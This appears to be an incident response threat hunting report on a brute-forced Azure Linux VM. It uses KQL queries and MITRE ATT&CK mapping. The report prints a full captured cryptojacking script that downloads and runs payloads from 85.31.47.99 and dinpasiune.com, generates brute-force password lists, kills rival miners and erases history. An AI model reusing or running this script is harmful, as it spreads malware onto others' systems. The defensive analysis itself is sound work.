$${{\color{Goldenrod}\Huge{\textsf{  Threat \ Hunting \ Report\ \}}}}\$$


$${{\color{Goldenrod}\large{\textsf{Executive Summary\ }}}}\$$

Between March 18-20, 2025, a Linux virtual machine in Microsoft Azure was compromised through brute-force attacks. The threat actor deployed cryptomining malware, tampered with system logs, and attempted to maintain persistence through SSH key manipulation and scheduled tasks. The compromise included advanced evasion tactics and aligns with multiple MITRE ATT&CK techniques. This report outlines the timeline, TTPs, findings, and required remediation steps.

The MITRE ATT&CK framework is used to map observed techniques, including:
- T1110 - Brute Force (Initial Access) – Repeated authentication attempts to compromise valid credentials.
- T1070 - Indicator Removal on Host (Defense Evasion) – Deletion or modification of logs to erase evidence of unauthorized access.
- T1562 - Impair Defenses (Defense Evasion) – Disabling or tampering with security logs and audit policies.
- T1078 - Valid Accounts (Persistence) – Use of compromised credentials to maintain unauthorized access.
<br> </br>

The report from Microsot Azure indicated that there was a violation of the Acceptable ue policy
Activity Summary 
- Date: 3/18/2025 6:40:40 AM
- Description: External reports of Brute Force traffic from you resource where recieved
- Reported Source: 20.81.228.191
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
![Brute Force](https://github.com/khadijahW/Flash028/blob/b971af3b32027a25815eb85b1137847f6d48a19e/VM%20threat%20%20(1).png)
${{\color{Goldenrod}\large{\textsf{Device Info\ }}}}\$
```
DeviceInfo
| where PublicIP == "20.81.228.191"
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$
- Device name was identified as "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"

${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1592:Gathering Victim Host information
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{Goldenrod}\large{\textsf{Device Logon Events\ }}}}\$
```
DeviceLogonEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ActionType == "LogonFailed"
| summarize count()by ActionType, FailureReason, DeviceName
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
- Device had 308 failed logon attempts indicateing evidence of brute force attempt

${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1110: Brute Force
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{Goldenrod}\large{\textsf{Device Network Events\ }}}}\$
```
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
|summarize count()by RemoteIP
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$
| IP Address        | Count |
|------------------|-------|
| 168.63.129.16   | 9     |
| 169.254.169.254 | 25    |
| 8.219.145.111   | 1     |
| 172.66.0.26     | 6     |
| 162.159.140.26  | 6     |
| 172.202.64.10   | 10    |
| 172.202.65.10   | 9     |
| 127.0.0.53      | 8     |
| 0.0.0.0         | 1     |
| 20.60.180.65    | 1     |
| 196.251.73.38   | 3     |
| 10.0.0.0        | 1     |
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{Goldenrod}\large{\textsf{Device Network Events\ }}}}\$
```
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
|summarize totalcount =count()
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$: 
- Total count of 184782
- the device attempted to connect to various ip addresses that 184782 times.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{Goldenrod}\large{\textsf{Device File Events\ }}}}\$
```
DeviceFileEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ActionType == "FileCreated"
| summarize count() by ActionType
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
- There were a total of 592 Files created

${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1565: Data Manipulation
- Detection: File Creation, File Deletion, File Modification
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{Goldenrod}\large{\textsf{Device File Events\ }}}}\$
```
DeviceFileEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ActionType == "FileDeleted" 
| summarize count()by ActionType
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$
- Analysis revealed that 7,025 files were deleted, which could indicate potential malicious behavior, automated script execution, or intentional cleanup activities by threat actors.
${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1565: Data Manipulation
- Detection: File Creation, File Deletion, File Modification
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{Goldenrod}\large{\textsf{Device Process Events\}}}}\$
```
DeviceProcessEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ProcessCommandLine contains "bash"
| project InitiatingProcessCommandLine
```
Output
- /bin/sh -c "/var/tmp/.update-logs/./History >/dev/null 2>&1 & disown
- /bin/bash /var/tmp/.update-logs/./.b

${{\color{Red}\large{\textsf{Findings:\ }}}}\$
- The use of the .update-logs command is a stealth technique commonly employed by threat actors or malicious scripts to manipulate or mask logging activity. This command may appear benign but is often used to disguise malicious behavior or log tampering.
- Additionally, redirecting output to /dev/null serves to:
  - Supress standard output and error messages making the activity less detectable to monitoring tools
  - Prevent log files from capturing execution results and minimizing traceability
<br> </br>

${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1070-Indicator Removal on Host(Defense Evasion)
- Detection: File Deletion, Modification,Process Creation
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{Goldenrod}\large{\textsf{Device Process Events\}}}}\$

![Query](https://github.com/khadijahW/Flash028/blob/a84d03ed8ed0696c89702957d620b2e3c2299da4/Query.png)
${{\color{Red}\large{\textsf{Findings:\ }}}}\$
- This detected execution of risky commands such as (wget,curl,chmod,etc)
- This query aslo flags processes operating in temporary directories
<br></br>
chmod +x /var/tmp/.update-logs/.bisis
- files with a . prefix are hidden which is a commone method to avoid detection
<br></br>
rm -f /tmp/tmp.4O5WBRQSz9 /tmp/tmp.A6UVHHtvt2 /tmp/tmp.qG8pAKPeQc
- rm -f forcefully deletes files without prompting, this file maybe used to hide the payload
<br></br>
wget https://secure.eicar.org/eicar.com.txt -O /tmp/eicar.txt
- potential attempt by the attacker to bypass antivirus detection
```
./retea -c '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 #!/bin/bash
key=$1
user=$2

if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
then
echo -e ""
else
echo Logged with successfully.
rm -rf .retea 
crontab -r ; pkill xrx ; pkill haiduc ; pkill blacku ; pkill xMEu ; cd /var/tmp ; rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents  /tmp/.tmp ; mkdir /tmp/.tmp ; pkill Opera ; rm -rf xmrig  .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ; wget -q dinpasiune.com/payload || curl -O -s -L dinpasiune.com/payload || wget85.31.47.99/payload || curl -O -s -L85.31.47.99/payload ; chmod +x * ; ./payload >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history
chmod +x .teaca ; ./.teaca > /dev/null 2>&1 ; history -c ; rm -rf .bash_history ~/.bash_history
fi

rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit -Hn ; ulimit -n 99999 -u 999999

cd /dev/shm
mkdir /dev/shm/.x > /dev/null 2>&1
mv network .x/
cd .x
rm -rf retea ips iptemp ips iplist
sleep 1
rm -rf pass
useri=`cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt|grep -v shutdown|cut -d: -f1`
echo $useri > .usrs
pasus=.usrs
check=`grep -c . .usrs`
for us in $(cat $pasus) ; do
printf "$us $us\n" >> pass
printf "$us $us"$us"\n" >> pass
printf "$us "$us"123\n" >> pass
printf "$us "$us"123456\n" >> pass
printf "$us 123456\n">> pass
printf "$us 1\n">> pass
printf "$us 12\n">> pass
printf "$us 123\n">> pass
printf "$us 1234\n">> pass
printf "$us 12345\n">> pass
printf "$us 12345678\n">> pass
printf "$us 123456789\n">> pass
printf "$us 123.com\n">> pass
printf "$us 123456.com\n">> pass
printf "$us 123\n" >> pass
printf "$us 1qaz@WSX\n" >> pass
printf "$us "$us"@123\n" >> pass
printf "$us "$us"@1234\n" >> pass
printf "$us "$us"@123456\n" >> pass
printf "$us "$us"123\n" >> pass
printf "$us "$us"1234\n" >> pass
printf "$us "$us"123456\n" >> pass
printf "$us qwer1234\n" >> pass
printf "$us 111111\n">> pass
printf "$us Passw0rd\n" >> pass
printf "$us P@ssw0rd\n" >> pass
printf "$us qaz123!@#\n" >> pass
printf "$us !@#\n" >> pass
printf "$us password\n" >> pass
printf "$us Huawei@123\n" >> pass
done
wait
sleep 0.5
cat bios.txt | sort -R | uniq | uniq > i
cat i > bios.txt
./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown  ; history -c ; rm -rf .bash_history ~/.bash_history"
sleep 25
function Miner {
rm -rf /dev/shm/retea /dev/shm/.magic ; rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot ;  rm -rf ~/.bash_history
history -c
}
Miner
' ./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
```
- This is a highly malicious script designed to execute a cryptojacking attack
- it extracts all valid system users from /etc/password
- then it generates a password list of common patterns
- pkill xmrig,killaall cnrig, killall xmrig: kills exisiting cryptominers
  
## Script Commands  
```
wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu
chmod +x cache
./cache >/dev/null 2>&1 & disown
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
- this downloads and tuns new cryptomining malware from a malicious server 85.31.47.99
- then rm -f is used to remove log and history
- crontab -r : aims to prevent system admins from scheduling security scans
<br></br>

${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1105-Ingress Tool Transfer
- T1059-Command and Scripting Interpreter

## Script Commands 
```
rm -rf /etc/sysctl.conf
echo "fs.file-max = 2097152" > /etc/sysctl.conf
sysctl -p
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
- Attempts to Modify system Limits(Priviledge Escalation)
- allowing more files to be open for intensive mining

${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1548- Abuse Elevation Control Mechanism


## Script Commands
```
mkdir /dev/shm/.x
cd /dev/shm/.x
mv network .x/
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$  
- /dev/shm/ is used to execute files in RAM, avoiding disk-based detection
<br></br>

${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1027-Obfuscated Files or Information
- T1070-Indicator removal on Host


## Script Commands 
```
chattr -iae ~/.ssh/authorized_keys
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
- Could disable SSH security and inset an attackers key for persitance

${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1098-Account Manipulation:SSH Authorized Keys


## Script Commands 
```
rm -f /opt/nessus_agent/var/nessus/tmp/nessusagent
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$ 
- Attacker is forcibly removing the nessus agent to avoid detection as well as prevent vulnerability scanning of the vm

${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1089-Disabling Security Tools

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{Goldenrod}\large{\textsf{Device Logon Events\ }}}}\$
```
DeviceLogonEvents
| where RemoteIP == "20.81.228.191"
| project Timestamp, DeviceName, AccountName, LogonType, ActionType, RemoteIP, RemotePort
| sort by Timestamp
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$
- Device name "xxlinuxprofixxx.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{Goldenrod}\large{\textsf{Device Logon Events\ }}}}\$
```
DeviceLogonEvents
| where RemoteIP == "20.81.228.191"
| project Timestamp, DeviceName, AccountName, LogonType, ActionType, RemoteIP, RemotePort
| summarize count()by ActionType
```
${{\color{Red}\large{\textsf{Findings:\ }}}}\$
- 100 failed Logon Attempts

${{\color{LightSkyBlue}\large{\textsf{MITRE ATTACK References:\ }}}}\$
- T1110: Brute Force
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{GoldenRod}\huge{\textsf{Summary Findings:\ }}}}\$

- Confirmed Brute Force Attempts: Over 400 failed login attempts, primarily from IP 20.81.228.191, validating credential stuffing activity (MITRE T1110).
- Suspicious File and Process Activity: 592 files created and 7,025 files deleted, indicating script-based manipulation and evasion (MITRE T1565, T1070).
- Cryptomining Malware Identified: Malicious shell scripts deployed cryptomining payloads (e.g., xmrig, cache) from external C2 servers (MITRE T1105, T1059).
- Use of Obfuscation: Commands executed via hidden files and memory-based paths (e.g., /dev/shm/.x) to evade detection (MITRE T1027).
- Security Tool Tampering: Attackers attempted to disable Nessus and remove audit trails to maintain persistence and avoid detection (MITRE T1089, T1070).
- SSH Key Manipulation: Potential SSH persistence through modification of authorized_keys (MITRE T1098).
- Privilege Escalation & Defense Impairment: System limits and logging policies were altered to enable long-term control and higher resource access (MITRE T1548, T1562).
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
${{\color{GoldenRod}\huge{\textsf{Recommended Actions:\ }}}}\$

- Isolate Affected Assets: Immediately quarantine sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net and any related systems.
- Reset Credentials: Force password resets for all accounts accessed or attempted via brute force. Implement account lockout policies.
- Reimage Infected Systems: Wipe and rebuild compromised devices to ensure complete removal of persistence mechanisms and backdoors.
- Patch & Harden Systems: Ensure all systems are fully patched. Disable unused services and restrict access to critical files and directories.
- Audit SSH Keys and Cron Jobs: Remove unauthorized SSH keys. Review and clean up crontab entries across users.
- Monitor for Re-infection: Set up high-fidelity alerts for command-line usage of wget, curl, chmod, pkill, disown, etc.
- Enable and Monitor EDR Logs: Ensure Defender for Endpoint and audit logging is fully operational and integrated with SIEM.
- Update Detection Rules: Add IOCs (e.g., 85.31.47.99, dinpasiune.com, file hashes) to threat feeds and custom rules.
- Educate and Alert Staff: Inform security teams of attack vectors used and conduct phishing/credential stuffing awareness training.
- Conduct a Full Threat Hunt: Expand threat hunting scope across the environment for lateral movement and persistence artifacts.



